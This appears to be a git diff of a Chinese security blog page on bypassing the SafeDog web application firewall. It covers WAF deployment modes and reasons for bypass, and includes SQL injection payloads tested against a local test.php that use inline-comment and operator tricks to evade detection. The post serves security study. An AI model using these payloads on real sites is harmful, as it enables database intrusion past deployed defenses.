@@ -1,23 +1,23 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+<head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="robots" content="noodp" />
     <title>绕waf系列之绕安全狗 - bysec</title><meta name="Description" content="bysec个人博客"><meta property="og:title" content="绕waf系列之绕安全狗" />
 <meta property="og:description" content="转载自： 网络 攻击的特定:攻击二象性:已知攻击和未知攻击 目前市面主流的WAF产品: 云WAF 阿里云盾 腾讯网站管家 创宇盾 ClodeFlare等 软件" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="http://localhost:1313/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/" /><meta property="og:image" content="http://localhost:1313/logo.png" /><meta property="article:section" content="posts" />
+<meta property="og:url" content="https://www.bysec.cn/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/" /><meta property="og:image" content="https://www.bysec.cn/logo.png" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2020-12-15T21:18:35+08:00" />
 <meta property="article:modified_time" content="2020-12-15T21:18:35+08:00" />
 <meta name="twitter:card" content="summary_large_image" />
-<meta name="twitter:image" content="http://localhost:1313/logo.png" /><meta name="twitter:title" content="绕waf系列之绕安全狗"/>
+<meta name="twitter:image" content="https://www.bysec.cn/logo.png" /><meta name="twitter:title" content="绕waf系列之绕安全狗"/>
 <meta name="twitter:description" content="转载自： 网络 攻击的特定:攻击二象性:已知攻击和未知攻击 目前市面主流的WAF产品: 云WAF 阿里云盾 腾讯网站管家 创宇盾 ClodeFlare等 软件"/>
 <meta name="application-name" content="bysec">
 <meta name="apple-mobile-web-app-title" content="bysec">
 
-<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://q.qlogo.cn/headimg_dl?dst_uin=1726946232&amp;spec=100"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://localhost:1313/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/" /><link rel="next" href="http://localhost:1313/%E7%BB%99%E8%A1%A8%E5%BC%9F%E7%9A%84web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%BB%BA%E8%AE%AE/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://q.qlogo.cn/headimg_dl?dst_uin=1726946232&amp;spec=100"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://www.bysec.cn/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97/" /><link rel="next" href="https://www.bysec.cn/%E7%BB%99%E8%A1%A8%E5%BC%9F%E7%9A%84web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E5%BB%BA%E8%AE%AE/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
         <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
         <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
     {
@@ -27,9 +27,9 @@
         "inLanguage": "zh-CN",
         "mainEntityOfPage": {
             "@type": "WebPage",
-            "@id": "http:\/\/localhost:1313\/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97\/"
+            "@id": "https:\/\/www.bysec.cn\/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97\/"
         },"genre": "posts","keywords": "waf","wordcount":  2191 ,
-        "url": "http:\/\/localhost:1313\/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97\/","datePublished": "2020-12-15T21:18:35+08:00","dateModified": "2020-12-15T21:18:35+08:00","publisher": {
+        "url": "https:\/\/www.bysec.cn\/%E7%BB%95waf%E7%B3%BB%E5%88%97%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97\/","datePublished": "2020-12-15T21:18:35+08:00","dateModified": "2020-12-15T21:18:35+08:00","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
                 "@type": "Person",
@@ -202,71 +202,71 @@
 </ul>
 <h1 id="waf的几种部署模式" class="headerLink">
     <a href="#waf%e7%9a%84%e5%87%a0%e7%a7%8d%e9%83%a8%e7%bd%b2%e6%a8%a1%e5%bc%8f" class="header-mark"></a>WAF的几种部署模式:</h1><h2 id="基于dns解析" class="headerLink">
-    <a href="#%e5%9f%ba%e4%ba%8edns%e8%a7%a3%e6%9e%90" class="header-mark"></a>基于DNS解析</h2><p>修改DNS,让域名解析到反向代理服务器,所有流量经过反向代理进行检测,检测无问题之后再转发给后端的web服务器
-<a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/1.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/1.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/1.png">
+    <a href="#%e5%9f%ba%e4%ba%8edns%e8%a7%a3%e6%9e%90" class="header-mark"></a>基于DNS解析</h2><p>修改DNS,让域名解析到反向代理服务器,所有流量经过反向代理进行检测,检测无问题之后再转发给后端的web服务器</p>
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000038owPw3KXKQa.png" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000038owPw3KXKQa.png" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000038owPw3KXKQa.png">
         <img
             
             loading="lazy"
-            src="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/1.png"
-            srcset="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/1.png, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/1.png 1.5x, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/1.png 2x"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD0000038owPw3KXKQa.png"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD0000038owPw3KXKQa.png, https://qqq.gtimg.cn/music/photo_new/T053XD0000038owPw3KXKQa.png 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD0000038owPw3KXKQa.png 2x"
             sizes="auto"
-            alt="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/1.png">
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD0000038owPw3KXKQa.png">
     </a></p>
 <h2 id="串联模式" class="headerLink">
     <a href="#%e4%b8%b2%e8%81%94%e6%a8%a1%e5%bc%8f" class="header-mark"></a>串联模式</h2><p>一般指的是反向代理模式,透明代理模式.反向代理模式会改变原有的网络拓扑,真实客户端ip会以HTTP header传递给后端web server.透明代理模式可以在不改变原有网络拓扑结构的情况下直接部署.
-<a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/2.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/2.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/2.png">
+<a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001mQ3fW2h609S.png" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001mQ3fW2h609S.png" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001mQ3fW2h609S.png">
         <img
             
             loading="lazy"
-            src="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/2.png"
-            srcset="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/2.png, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/2.png 1.5x, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/2.png 2x"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000001mQ3fW2h609S.png"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000001mQ3fW2h609S.png, https://qqq.gtimg.cn/music/photo_new/T053XD000001mQ3fW2h609S.png 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000001mQ3fW2h609S.png 2x"
             sizes="auto"
-            alt="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/2.png">
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000001mQ3fW2h609S.png">
     </a></p>
-<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/3.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/3.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/3.png">
+<p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001S1yDo2LaIZh.png" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001S1yDo2LaIZh.png" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001S1yDo2LaIZh.png">
         <img
             
             loading="lazy"
-            src="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/3.png"
-            srcset="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/3.png, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/3.png 1.5x, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/3.png 2x"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000001S1yDo2LaIZh.png"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000001S1yDo2LaIZh.png, https://qqq.gtimg.cn/music/photo_new/T053XD000001S1yDo2LaIZh.png 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000001S1yDo2LaIZh.png 2x"
             sizes="auto"
-            alt="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/3.png">
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000001S1yDo2LaIZh.png">
     </a></p>
 <h2 id="旁路模式" class="headerLink">
     <a href="#%e6%97%81%e8%b7%af%e6%a8%a1%e5%bc%8f" class="header-mark"></a>旁路模式</h2><p>利用流量镜像技术,将业务流量分流给WAF产品,这种部署模式的优点是不会影响业务稳定性,所以WAF会投入更多的性能在检出率上面.但是缺点也很明显,不借助其他手段无法对检测出的攻击行为进行阻断.
-<a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/4.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/4.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/4.png">
+<a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000PZ9py34eDf2.png" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000PZ9py34eDf2.png" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000PZ9py34eDf2.png">
         <img
             
             loading="lazy"
-            src="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/4.png"
-            srcset="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/4.png, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/4.png 1.5x, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/4.png 2x"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000000PZ9py34eDf2.png"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000000PZ9py34eDf2.png, https://qqq.gtimg.cn/music/photo_new/T053XD000000PZ9py34eDf2.png 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000000PZ9py34eDf2.png 2x"
             sizes="auto"
-            alt="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/4.png">
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000000PZ9py34eDf2.png">
     </a></p>
 <h2 id="软件嵌入中间件检测引擎模式" class="headerLink">
     <a href="#%e8%bd%af%e4%bb%b6%e5%b5%8c%e5%85%a5%e4%b8%ad%e9%97%b4%e4%bb%b6%e6%a3%80%e6%b5%8b%e5%bc%95%e6%93%8e%e6%a8%a1%e5%bc%8f" class="header-mark"></a>软件嵌入中间件+检测引擎模式</h2><p>在使用nginx作为反向代理的业务中,WAF提高nginx模块嵌入原有nginx,将请求转发给检测引擎,可以做到在不改动原有的网络拓扑的情况下完成检测任务
-<a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/5.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/5.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/5.png">
+<a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000TKz9g0Ye2qC.png" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000TKz9g0Ye2qC.png" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000TKz9g0Ye2qC.png">
         <img
             
             loading="lazy"
-            src="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/5.png"
-            srcset="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/5.png, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/5.png 1.5x, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/5.png 2x"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000000TKz9g0Ye2qC.png"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000000TKz9g0Ye2qC.png, https://qqq.gtimg.cn/music/photo_new/T053XD000000TKz9g0Ye2qC.png 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000000TKz9g0Ye2qC.png 2x"
             sizes="auto"
-            alt="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/5.png">
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000000TKz9g0Ye2qC.png">
     </a></p>
 <h1 id="waf为什么会被绕过" class="headerLink">
     <a href="#waf%e4%b8%ba%e4%bb%80%e4%b9%88%e4%bc%9a%e8%a2%ab%e7%bb%95%e8%bf%87" class="header-mark"></a>WAF为什么会被绕过:</h1><ol>
 <li>鱼(安全)和熊掌(业务性能)不能兼得,waf需要满足基本业务需求,所以一般不设置白名单之类的过于苛刻的操作</li>
 <li>WAF为了考虑通用性的问题,无法100%覆盖某些语言,中间件,数据库等特性</li>
 <li>硬件WAF自身往往存在漏洞
-<a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/6.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/6.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/6.png">
+<a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000001ffOfV4D82q4.png" title="https://qqq.gtimg.cn/music/photo_new/T053XD000001ffOfV4D82q4.png" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000001ffOfV4D82q4.png">
         <img
             
             loading="lazy"
-            src="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/6.png"
-            srcset="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/6.png, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/6.png 1.5x, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/6.png 2x"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000001ffOfV4D82q4.png"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000001ffOfV4D82q4.png, https://qqq.gtimg.cn/music/photo_new/T053XD000001ffOfV4D82q4.png 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000001ffOfV4D82q4.png 2x"
             sizes="auto"
-            alt="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/6.png">
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000001ffOfV4D82q4.png">
     </a></li>
 </ol>
 <ul>
@@ -278,14 +278,14 @@
     <a href="#waf%e7%bb%95%e8%bf%87%e5%ae%9e%e6%88%98-%e7%bb%95%e8%bf%87%e5%ae%89%e5%85%a8%e7%8b%97%e8%bf%9b%e8%a1%8c%e6%b3%a8%e5%85%a5" class="header-mark"></a>WAF绕过实战—-绕过安全狗进行注入</h1><p>所谓的bypass waf实际上是去寻找位于waf设备之后处理应用层数据包的硬件/软件的特性,利用特性构造waf不能命中,但是在应用程序能够执行成功的payload,绕过防护</p>
 <h2 id="实验环境" class="headerLink">
     <a href="#%e5%ae%9e%e9%aa%8c%e7%8e%af%e5%a2%83" class="header-mark"></a>实验环境:</h2><p>环境:安全狗Apache最新版
-<a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/7.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/7.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/7.png">
+<a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000035UmzQ3l20rx.png" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000035UmzQ3l20rx.png" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000035UmzQ3l20rx.png">
         <img
             
             loading="lazy"
-            src="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/7.png"
-            srcset="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/7.png, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/7.png 1.5x, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/7.png 2x"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD0000035UmzQ3l20rx.png"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD0000035UmzQ3l20rx.png, https://qqq.gtimg.cn/music/photo_new/T053XD0000035UmzQ3l20rx.png 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD0000035UmzQ3l20rx.png 2x"
             sizes="auto"
-            alt="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/7.png">
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD0000035UmzQ3l20rx.png">
     </a></p>
 <p>本地测试代码(PHP):</p>
 <div class="highlight"><div class="chroma">
@@ -326,14 +326,14 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1  and 1=1%23
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/8.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/8.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/8.png">
+</div><p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD0000017AyI41ldNmF.png" title="https://qqq.gtimg.cn/music/photo_new/T053XD0000017AyI41ldNmF.png" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD0000017AyI41ldNmF.png">
         <img
             
             loading="lazy"
-            src="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/8.png"
-            srcset="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/8.png, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/8.png 1.5x, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/8.png 2x"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD0000017AyI41ldNmF.png"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD0000017AyI41ldNmF.png, https://qqq.gtimg.cn/music/photo_new/T053XD0000017AyI41ldNmF.png 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD0000017AyI41ldNmF.png 2x"
             sizes="auto"
-            alt="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/8.png">
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD0000017AyI41ldNmF.png">
     </a></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -385,14 +385,14 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1&#39; %26%26 true%23
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/9.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/9.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/9.png">
+</div><p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000002ltaSN09T2pj.png" title="https://qqq.gtimg.cn/music/photo_new/T053XD000002ltaSN09T2pj.png" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000002ltaSN09T2pj.png">
         <img
             
             loading="lazy"
-            src="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/9.png"
-            srcset="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/9.png, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/9.png 1.5x, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/9.png 2x"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000002ltaSN09T2pj.png"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000002ltaSN09T2pj.png, https://qqq.gtimg.cn/music/photo_new/T053XD000002ltaSN09T2pj.png 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000002ltaSN09T2pj.png 2x"
             sizes="auto"
-            alt="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/9.png">
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000002ltaSN09T2pj.png">
     </a></p>
 <p>另外在分享一些可以绕过目前版本的安全狗测试payload (注:mysql支持&amp;&amp; || ,oracle不支持 &amp;&amp; ||）</p>
 <div class="highlight"><div class="chroma">
@@ -421,35 +421,35 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1/test.php?id=1&#39; /*!order*//*!by*/2%23
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/10.png" title="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/10.png" data-thumbnail="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/10.png">
+</div><p><a class="lightgallery" href="https://qqq.gtimg.cn/music/photo_new/T053XD000000OmjxO4G127o.png" title="https://qqq.gtimg.cn/music/photo_new/T053XD000000OmjxO4G127o.png" data-thumbnail="https://qqq.gtimg.cn/music/photo_new/T053XD000000OmjxO4G127o.png">
         <img
             
             loading="lazy"
-            src="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/10.png"
-            srcset="https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/10.png, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/10.png 1.5x, https://www.bysec.cn/OSS/img/%e7%bb%95waf%e7%b3%bb%e5%88%97%e4%b9%8b%e7%bb%95%e5%ae%89%e5%85%a8%e7%8b%97/10.png 2x"
+            src="https://qqq.gtimg.cn/music/photo_new/T053XD000000OmjxO4G127o.png"
+            srcset="https://qqq.gtimg.cn/music/photo_new/T053XD000000OmjxO4G127o.png, https://qqq.gtimg.cn/music/photo_new/T053XD000000OmjxO4G127o.png 1.5x, https://qqq.gtimg.cn/music/photo_new/T053XD000000OmjxO4G127o.png 2x"
             sizes="auto"
-            alt="https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/10.png">
+            alt="https://qqq.gtimg.cn/music/photo_new/T053XD000000OmjxO4G127o.png">
     </a></p>
 <h2 id="绕过union-select查询" class="headerLink">
     <a href="#%e7%bb%95%e8%bf%87union-select%e6%9f%a5%e8%af%a2" class="header-mark"></a>绕过union select查询</h2><p>使用union xxx页面正常
